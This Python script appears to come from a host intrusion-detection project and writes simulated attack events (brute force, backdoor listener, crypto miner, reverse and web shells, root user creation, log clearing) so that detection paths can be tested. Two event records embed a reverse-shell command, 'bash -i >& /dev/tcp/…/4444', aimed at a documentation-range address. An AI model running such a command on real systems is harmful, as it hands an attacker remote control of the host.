#!/usr/bin/env python3
"""Generate synthetic attacks so every detection and response path can be demonstrated.

Addresses come from the documentation ranges (RFC 5737), so a simulated attacker
can never match a real host. Events are marked with src "simulator", and the responder
never acts on those, so this is safe even on a host in enforce mode.
"""

from __future__ import annotations

import argparse
import datetime as dt
import random
import socket
import sys
import time
from pathlib import Path
from typing import Any, List, Optional

if __package__ in (None, ""):  # allow `python utils/simulate_events.py`
    sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from common.runtime import (
    METRIC_FIELDS,
    append_bytes,
    append_jsonl,
    exit_with_supervisor,
    get_paths,
    harden_process,
    load_config,
    now_iso,
    to_iso,
    utc_now,
)

USERS = ["alice", "bob", "charlie", "dana", "erin", "frank"]
IP_POOL = [f"203.0.113.{i}" for i in range(1, 60)] + [f"198.51.100.{i}" for i in range(1, 60)]


def emit(event_type: str, **fields: Any) -> None:
    event = {
        "ts": now_iso(),
        "src": "simulator",
        "type": event_type,
        "host": socket.gethostname(),
        **fields,
    }
    append_jsonl(get_paths().events, event)


def metrics_row(when: dt.datetime, stressed: bool) -> str:
    if stressed:
        cpu, mem, load = random.uniform(96, 99), random.uniform(15200, 15800), random.uniform(14, 18)
        procs, conns = random.randint(420, 480), random.randint(800, 950)
        received, sent = random.uniform(9000, 11000), random.uniform(38000, 45000)
    else:
        cpu, mem, load = random.uniform(8, 22), random.uniform(5800, 6600), random.uniform(0.3, 1.1)
        procs, conns = random.randint(180, 210), random.randint(40, 70)
        received, sent = random.uniform(100, 400), random.uniform(50, 200)
    return ",".join(
        [
            to_iso(when), f"{cpu:.2f}", f"{mem:.0f}", "16000", f"{load:.2f}", f"{load * 0.9:.2f}",
            f"{load * 0.8:.2f}", str(procs), str(conns), f"{received:.1f}", f"{sent:.1f}",
        ]
    )


def write_metrics(rows: List[str]) -> None:
    path = get_paths().ensure().metrics
    is_new = not path.exists() or path.stat().st_size == 0
    lines = ([",".join(METRIC_FIELDS)] if is_new else []) + rows
    append_bytes(path, ("\n".join(lines) + "\n").encode("utf-8"))


def seed_baseline(rows: int = 240) -> None:
    """Write a calm history for the anomaly model to learn from."""
    now = utc_now()
    write_metrics(
        [metrics_row(now - dt.timedelta(seconds=30 * (rows - i)), False) for i in range(rows)]
    )


def set_host_state(stressed: bool) -> None:
    # Timestamps have one-second resolution, so keep neighbouring events on either
    # side of this change from landing in the same second as the metrics row.
    time.sleep(1.1)
    write_metrics([metrics_row(utc_now(), stressed)])
    time.sleep(1.1)


def simulate_auth_failures(ip: Optional[str] = None, count: int = 6) -> str:
    source = ip or random.choice(IP_POOL)
    user = random.choice(USERS)
    for _ in range(count):
        emit("auth_fail", ip=source, user=user, msg=f"Failed password for {user} from {source}")
        time.sleep(0.05)
    return source


def simulate_spray() -> None:
    source = random.choice(IP_POOL)
    for user in USERS:
        emit("auth_fail", ip=source, user=user, msg=f"Failed password for {user} from {source}")
        time.sleep(0.2)


def simulate_probe() -> None:
    """What brute force looks like against a server that only accepts keys."""
    source = random.choice(IP_POOL)
    for user in ("oracle", "admin", "test", "ubuntu", "postgres", "git"):
        for kind in ("invalid_user", "preauth_close"):
            emit("auth_probe", ip=source, user=user, msg=f"Invalid user {user} from {source}", meta={"kind": kind})
            time.sleep(0.02)


def simulate_compromise() -> None:
    """A brute force that succeeds. Blocking and locking need no help from host load."""
    source = simulate_auth_failures()
    user = random.choice(USERS)
    emit("auth_success", ip=source, user=user, msg=f"Accepted password for {user} from {source}")


def simulate_new_port(port: Optional[int] = None) -> None:
    emit(
        "new_port",
        port=port or random.randint(40000, 50000),
        pid=random.randint(20000, 60000),
        meta={"proc": "python3", "exe": "/usr/bin/python3", "bind_ip": "0.0.0.0", "exposed": True},
    )


def simulate_backdoor() -> None:
    """A netcat listener on a privileged port while the host is under strain."""
    set_host_state(stressed=True)
    emit(
        "new_port",
        port=random.choice([23, 513, 777, 999]),
        pid=random.randint(20000, 60000),
        meta={"proc": "nc", "exe": "/usr/bin/nc", "bind_ip": "0.0.0.0", "exposed": True},
    )
    set_host_state(stressed=False)


def simulate_suspicious_process() -> None:
    emit(
        "suspicious_proc",
        pid=random.randint(20000, 60000),
        user="www-data",
        msg="xmrig",
        meta={"proc": "xmrig", "exe": "/tmp/.x/xmrig", "flags": ["malicious"]},
    )


def simulate_busy_process() -> None:
    """Something legitimate that is simply busy. This must be reported and left alone."""
    emit(
        "suspicious_proc",
        pid=random.randint(20000, 60000),
        user="postgres",
        msg="postgres",
        meta={"proc": "postgres", "exe": "/usr/lib/postgresql/16/bin/postgres",
              "flags": ["cpu"], "cpu": 91.4, "mem": 22.0},
    )


def simulate_reverse_shell() -> None:
    emit(
        "reverse_shell",
        pid=random.randint(20000, 60000),
        user="www-data",
        msg="bash",
        meta={"proc": "bash", "exe": "/usr/bin/bash", "parent": "php-fpm"},
    )


def simulate_web_shell() -> None:
    emit(
        "webshell_spawn",
        pid=random.randint(20000, 60000),
        user="www-data",
        msg="sh",
        meta={"proc": "sh", "exe": "/usr/bin/dash", "parent": "nginx"},
    )


def simulate_malicious_command() -> None:
    emit(
        "malicious_command",
        pid=random.randint(20000, 60000),
        user="www-data",
        msg="bash",
        meta={
            "proc": "bash", "exe": "/usr/bin/bash", "parent": "cron", "indicator": "reverse_shell_dev_tcp",
            "confidence": "high", "summary": "Interactive shell wired to a network connection",
            "mitre": ["T1059.004"], "command": "bash -i >& /dev/tcp/203.0.113.77/4444 0>&1",
        },
    )


def simulate_new_user(root_equivalent: bool = False) -> None:
    uid = 0 if root_equivalent else random.randint(1001, 1900)
    name = f"svc{random.randint(100, 999)}"
    emit("user_add", user=name, msg=f"new user: name={name}, UID={uid}", meta={"uid": uid})


def simulate_privilege_change() -> None:
    user = random.choice(USERS)
    emit("group_add", user=user, msg=f"add '{user}' to group 'sudo'", meta={"group": "sudo"})


def simulate_file_change() -> None:
    emit(
        "file_change",
        msg="/root/.ssh/authorized_keys modified",
        meta={"path": "/root/.ssh/authorized_keys", "change": "modified", "category": "ssh_keys"},
    )


def simulate_campaign() -> None:
    """One intrusion from start to finish, which is what an incident is for."""
    source = random.choice(IP_POOL)
    user = random.choice(USERS)
    for _ in range(6):
        emit("auth_fail", ip=source, user=user, msg=f"Failed password for {user} from {source}")
        time.sleep(0.05)
    emit("auth_success", ip=source, user=user, msg=f"Accepted password for {user} from {source}")
    time.sleep(0.4)
    emit(
        "file_change",
        msg=f"/home/{user}/.ssh/authorized_keys modified",
        meta={"path": f"/home/{user}/.ssh/authorized_keys", "change": "modified", "category": "ssh_keys"},
    )
    time.sleep(0.4)
    emit(
        "file_change",
        msg="/etc/cron.d/update added",
        meta={"path": "/etc/cron.d/update", "change": "added", "category": "cron"},
    )
    time.sleep(0.4)
    emit(
        "malicious_command",
        pid=random.randint(20000, 60000),
        user=user,
        msg="bash",
        meta={
            "proc": "bash", "exe": "/usr/bin/bash", "parent": "cron", "indicator": "reverse_shell_dev_tcp",
            "confidence": "high", "summary": "Interactive shell wired to a network connection",
            "mitre": ["T1059.004"], "command": f"bash -i >& /dev/tcp/{source}/4444 0>&1",
        },
    )
    time.sleep(0.4)
    emit("log_cleared", msg="/var/log/auth.log shrank while being read", meta={"log": "/var/log/auth.log"})


def simulate_log_clearing() -> None:
    emit("log_cleared", msg="/var/log/auth.log shrank while being read", meta={"log": "/var/log/auth.log"})


SCENARIOS = {
    # Ordinary activity first: it reads differently once a compromise is open.
    "busy": simulate_busy_process,
    "port": simulate_new_port,
    "useradd": simulate_new_user,
    "brute": simulate_auth_failures,
    "spray": simulate_spray,
    "probe": simulate_probe,
    "compromise": simulate_compromise,
    "backdoor": simulate_backdoor,
    "proc": simulate_suspicious_process,
    "revshell": simulate_reverse_shell,
    "webshell": simulate_web_shell,
    "command": simulate_malicious_command,
    "rootuser": lambda: simulate_new_user(root_equivalent=True),
    "group": simulate_privilege_change,
    "logclear": simulate_log_clearing,
    "filechange": simulate_file_change,
    "campaign": simulate_campaign,
}


def run_all() -> None:
    for name, scenario in SCENARIOS.items():
        print(f"scenario: {name}", flush=True)
        scenario()
        time.sleep(0.5)


def main(argv: Optional[List[str]] = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--scenario", choices=["all", *SCENARIOS], default="all")
    parser.add_argument("--loop", action="store_true", help="repeat until interrupted")
    parser.add_argument("--interval", type=float, default=20, help="seconds between loops")
    parser.add_argument("--no-baseline", action="store_true", help="skip seeding metrics")
    args = parser.parse_args(argv)

    harden_process()
    exit_with_supervisor()
    paths = get_paths(load_config()).ensure()
    if not args.no_baseline and (not paths.metrics.exists() or paths.metrics.stat().st_size == 0):
        seed_baseline()
    set_host_state(stressed=False)

    try:
        while True:
            run_all() if args.scenario == "all" else SCENARIOS[args.scenario]()
            if not args.loop:
                return 0
            time.sleep(args.interval)
    except KeyboardInterrupt:
        return 0


if __name__ == "__main__":
    sys.exit(main())
